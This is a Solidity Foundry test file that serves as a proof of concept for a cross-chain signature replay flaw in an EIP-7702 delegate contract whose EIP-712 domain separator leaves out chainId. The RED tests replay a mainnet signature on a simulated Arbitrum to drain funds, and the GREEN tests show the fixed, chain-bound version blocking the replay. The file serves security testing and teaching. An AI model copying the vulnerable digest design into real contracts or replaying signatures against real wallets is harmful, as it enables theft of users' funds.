// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/vulnerable/DC03_CrossChainDelegate.sol";
import "../src/fixed/DC03_SafeChainDelegate.sol";

/**
 * @title DC03_CrossChainReplayTest
 * @author Aditya Chotaliya [adityachotaliya.xyz]
 * @notice PoC tests for DC-03: Cross-chain replay via chain_id = 0
 *
 * Simulation approach:
 *   We simulate "two chains" by forking at different chainIds using
 *   vm.chainId() to switch the active chain ID mid-test.
 *   A signature produced on chainId=1 (mainnet) is replayed on chainId=42161
 *   (Arbitrum) to prove the vulnerability.
 */
contract DC03_CrossChainReplayTest is Test {
    address payable public victimEOA;
    uint256 public victimKey;

    address public attacker;
    address public recipient;

    DC03_CrossChainDelegate  public vulnDelegate;
    DC03_SafeChainDelegate   public safeDelegate;

    // Simulate mainnet and Arbitrum chain IDs
    uint256 constant MAINNET_CHAIN_ID  = 1;
    uint256 constant ARBITRUM_CHAIN_ID = 42161;

    function setUp() public {
        victimKey = 0xA11CE;
        victimEOA = payable(vm.addr(victimKey));
        attacker  = makeAddr("attacker");
        recipient = makeAddr("recipient");

        vm.deal(victimEOA, 10 ether);

        vulnDelegate = new DC03_CrossChainDelegate();
        safeDelegate = new DC03_SafeChainDelegate();
    }

    // =========================================================================
    // RED TESTS - cross-chain replay on vulnerable delegate
    // =========================================================================

    /**
     * @notice RED: Signature produced on mainnet replayed on Arbitrum
     *
     * 1. Victim signs a batch tx on mainnet (chainId=1)
     * 2. Attacker replays the SAME sig bytes on Arbitrum (chainId=42161)
     * 3. Execution succeeds because domain separator has no chainId binding
     */
    function test_RED_CrossChainReplay() public {
        console.log("=== DC-03 CROSS-CHAIN REPLAY EXPLOIT ===");

        // --- MAINNET (chainId = 1) ---
        vm.chainId(MAINNET_CHAIN_ID);
        _etch7702(victimEOA, address(vulnDelegate));

        // Victim initializes on mainnet
        vm.prank(victimEOA);
        DC03_CrossChainDelegate(victimEOA).initialize(victimEOA);

        // Victim signs a batch: send 1 ETH to recipient
        address[] memory targets   = new address[](1);
        bytes[]   memory calldatas = new bytes[](1);
        uint256[] memory values    = new uint256[](1);
        targets[0]   = recipient;
        calldatas[0] = "";
        values[0]    = 1 ether;

        bytes32 digest = _buildVulnDigest(targets, calldatas, values, 0);
        bytes memory sig = _sign(victimKey, digest);

        console.log("Victim signed batch on mainnet (chainId=1)");
        console.log("Victim balance on mainnet before:", victimEOA.balance / 1e18, "ETH");

        // 1. SNAPSHOT STATE (Nonce = 0)
        uint256 snapshotId = vm.snapshot();

        // Execute on mainnet - works as intended
        DC03_CrossChainDelegate(victimEOA).executeBatch(targets, calldatas, values, sig);
        console.log("Victim balance on mainnet after:", victimEOA.balance / 1e18, "ETH");

       
        vm.revertTo(snapshotId);
        
        // 3. Manually credit the recipient the 1 ETH they earned on Mainnet 
        vm.deal(recipient, 1 ether);

        // --- ARBITRUM (chainId = 42161) ---
        vm.deal(victimEOA, 10 ether);
        vm.chainId(ARBITRUM_CHAIN_ID);

        // Victim delegates on Arbitrum too
        _etch7702(victimEOA, address(vulnDelegate));
        
        console.log("Switched to Arbitrum (chainId=42161)");
        console.log("Victim Arbitrum balance before replay:", victimEOA.balance / 1e18, "ETH");

        // Nonce on Arbitrum is 0 (fresh) - matches the signed nonce
        vm.prank(attacker);
        DC03_CrossChainDelegate(victimEOA).executeBatch(targets, calldatas, values, sig);

        console.log("Victim Arbitrum balance after replay:", victimEOA.balance / 1e18, "ETH");
        console.log("REPLAY SUCCESS: mainnet signature drained Arbitrum funds!");

        // Victim lost 1 ETH on Arbitrum without signing anything on Arbitrum
        assertEq(recipient.balance, 2 ether, "Recipient got ETH on both chains from one signing");
    }

    /**
     * @notice RED: Domain separator is identical across chains - proves the root cause
     */
    function test_RED_DomainSeparatorIdenticalAcrossChains() public {
        _etch7702(victimEOA, address(vulnDelegate));

        vm.chainId(MAINNET_CHAIN_ID);
        bytes32 domainOnMainnet = DC03_CrossChainDelegate(victimEOA).domainSeparator();

        vm.chainId(ARBITRUM_CHAIN_ID);
        bytes32 domainOnArbitrum = DC03_CrossChainDelegate(victimEOA).domainSeparator();

        console.log("=== DC-03 DOMAIN SEPARATOR COMPARISON ===");
        console.logBytes32(domainOnMainnet);
        console.logBytes32(domainOnArbitrum);

        //  Same domain separator on both chains - signature is chain-agnostic
        assertEq(domainOnMainnet, domainOnArbitrum, "VULN: domain separator is chain-agnostic");
    }

    // =========================================================================
    // GREEN TESTS - chain-bound domain separator blocks replay
    // =========================================================================

    /**
     * @notice GREEN: Mainnet signature CANNOT be replayed on Arbitrum with safe delegate
     */
    function test_GREEN_ReplayBlockedByChainId() public {
        console.log("=== DC-03 FIXED: Chain-bound Domain Separator ===");

        // --- MAINNET ---
        vm.chainId(MAINNET_CHAIN_ID);
        _etch7702(victimEOA, address(safeDelegate));
        vm.prank(victimEOA);
        DC03_SafeChainDelegate(victimEOA).initialize(victimEOA);

        address[] memory targets   = new address[](1);
        bytes[]   memory calldatas = new bytes[](1);
        uint256[] memory values    = new uint256[](1);
        targets[0]   = recipient;
        calldatas[0] = "";
        values[0]    = 1 ether;

        // Sign on mainnet
        bytes32 digest = _buildSafeDigest(targets, calldatas, values, 0, MAINNET_CHAIN_ID);
        bytes memory sig = _sign(victimKey, digest);

        // Execute on mainnet - works fine
        DC03_SafeChainDelegate(victimEOA).executeBatch(targets, calldatas, values, sig);

        // --- ARBITRUM ---
        vm.deal(victimEOA, 10 ether);
        vm.chainId(ARBITRUM_CHAIN_ID);
        _etch7702(victimEOA, address(safeDelegate));

        // Attacker tries to replay the mainnet signature on Arbitrum
        vm.prank(attacker);
        vm.expectRevert("invalid signature");
        DC03_SafeChainDelegate(victimEOA).executeBatch(targets, calldatas, values, sig);

        console.log("Replay blocked! Victim Arbitrum funds safe:", victimEOA.balance / 1e18, "ETH");
        assertEq(victimEOA.balance, 10 ether, "Arbitrum funds untouched");
    }

    /**
     * @notice GREEN: Domain separators differ across chains with safe delegate
     */
    function test_GREEN_DomainSeparatorDiffersPerChain() public {
        _etch7702(victimEOA, address(safeDelegate));

        vm.chainId(MAINNET_CHAIN_ID);
        vm.prank(victimEOA);
        DC03_SafeChainDelegate(victimEOA).initialize(victimEOA);
        bytes32 domainOnMainnet = DC03_SafeChainDelegate(victimEOA).domainSeparator();

        vm.chainId(ARBITRUM_CHAIN_ID);
        bytes32 domainOnArbitrum = DC03_SafeChainDelegate(victimEOA).domainSeparator();

        console.log("=== DC-03 FIXED: Domain Separators ===");
        console.logBytes32(domainOnMainnet);
        console.logBytes32(domainOnArbitrum);

        //  Domain separators are different on each chain
        assertTrue(domainOnMainnet != domainOnArbitrum, "SAFE: domain separators differ per chain");
    }

    // =========================================================================
    // Helpers
    // =========================================================================

    function _etch7702(address eoa, address delegate) internal {
        vm.etch(eoa, delegate.code);
    }

    function _sign(uint256 key, bytes32 digest) internal pure returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, digest);
        return abi.encodePacked(r, s, v);
    }

    function _buildVulnDigest(
        address[] memory targets,
        bytes[]   memory calldatas,
        uint256[] memory values,
        uint256 nonce
    ) internal view returns (bytes32) {
        bytes32 DOMAIN_TYPEHASH = keccak256(
            "EIP712Domain(string name,string version,address verifyingContract)"
        );
        bytes32 BATCH_TYPEHASH = keccak256(
            "BatchExecute(address[] targets,bytes[] calldatas,uint256[] values,uint256 nonce)"
        );
        bytes32 domSep = keccak256(abi.encode(
            DOMAIN_TYPEHASH,
            keccak256("DelegateExecutor"),
            keccak256("1"),
            address(victimEOA)
        ));
        bytes32 structHash = keccak256(abi.encode(
            BATCH_TYPEHASH,
            keccak256(abi.encodePacked(targets)),
            keccak256(abi.encode(calldatas)),
            keccak256(abi.encodePacked(values)),
            nonce
        ));
        return keccak256(abi.encodePacked("\x19\x01", domSep, structHash));
    }

    function _buildSafeDigest(
        address[] memory targets,
        bytes[]   memory calldatas,
        uint256[] memory values,
        uint256 nonce,
        uint256 chainId
    ) internal view returns (bytes32) {
        bytes32 DOMAIN_TYPEHASH = keccak256(
            "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
        );
        bytes32 BATCH_TYPEHASH = keccak256(
            "BatchExecute(address[] targets,bytes[] calldatas,uint256[] values,uint256 nonce)"
        );
        bytes32 domSep = keccak256(abi.encode(
            DOMAIN_TYPEHASH,
            keccak256("DelegateExecutor"),
            keccak256("1"),
            chainId,
            address(victimEOA)
        ));
        bytes32 structHash = keccak256(abi.encode(
            BATCH_TYPEHASH,
            keccak256(abi.encodePacked(targets)),
            keccak256(abi.encode(calldatas)),
            keccak256(abi.encodePacked(values)),
            nonce
        ));
        return keccak256(abi.encodePacked("\x19\x01", domSep, structHash));
    }
}
